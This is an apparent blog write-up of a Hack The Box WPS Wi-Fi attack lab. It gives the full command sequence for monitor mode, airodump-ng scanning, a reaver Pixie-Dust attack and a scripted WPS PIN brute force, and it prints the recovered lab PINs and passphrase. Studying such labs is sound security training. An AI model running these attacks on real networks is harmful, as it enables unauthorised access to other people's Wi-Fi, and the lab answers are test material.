---
title: Wi-Fi WPS Attacks Skills Assessment
description: this is the writuep for hackthebox skills assessment for WPS wifi attacks
date: '2026-09-20'
tags:
  - wifi
  - pentesting
  - hacking
  - networking
published: true
slug: wi-fi-wps-attacks-skills-assessment
category: Wifi Pentesting
platform: Hack The Box
difficulty: Medium
---
# Skills Assessment WPS Attacks Writeup
We were given an IP

# Recon

running these commands revealed the WPS networks:

```bash
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
airodump-ng mon0 --wps
```

first 2 commands to setup moniter mode without using airmon-ng due to the reaver having trouble with airmon-ng

```bash

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 56:46:40:45:BB:1C  -28      109        0    0   1   54   WPA2 CCMP   PSK  2.0    VirtualCorp                                              
 72:40:6E:74:2F:3B  -28      109        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheBox-Corp                                          

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

# Attack 

we can see 2 networks

our first task is finding the pin of VirtualCorp

Let's try pixie-dust attack since its quick:

```bash
reaver -K 1 -vvv -b 56:46:40:45:BB:1C -c 1-i mon0
```

in a low amount of time we get:

```

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x8273df6a
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     e87e298c9002a6c8605924046ab0a1be
 [*] PSK2:     ab9b8465c65172ef7b72973bbdfdff7b
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  98990987

 [*] Time taken: 0 s 32 ms
```



# HackTheBox-Corp

Trying Pixie-Dust on this network didnt work at all.

Therefore we are going to online bruteforce

we are going to be using the shorter routes first:

[[Using PIN Generation tools]]

But the tools werent on the box. 
So i used [[Using Multiple Pre-Defined PINs]]


running:

```bash
wpspin -A 72:40:6E:74:2F:3B | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' ' 
```
which gave us:

```
76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212
```

Let's use the script to test:

```bash
#!/bin/bash

#We add generated PINs into this list
PINS='76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 72:40:6E:74:2F:3B -c 1 -p $PIN
done
echo "PIN Guesses Complete"
```


letting it run a while and reviewing the output, we get:

```
Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 72:40:6E:74:2F:3B
[+] Received beacon from 72:40:6E:74:2F:3B
[!] Found packet with bad FCS, skipping...
[+] Associated with 72:40:6E:74:2F:3B (ESSID: HackTheBox-Corp)
[+] WPS PIN: '31080279'
[+] WPA PSK: 'G3neRate_S0m3_PIN$'
[+] AP SSID: 'HackTheBox-Corp'
Attempting PIN: 10149713
```



And That's all.
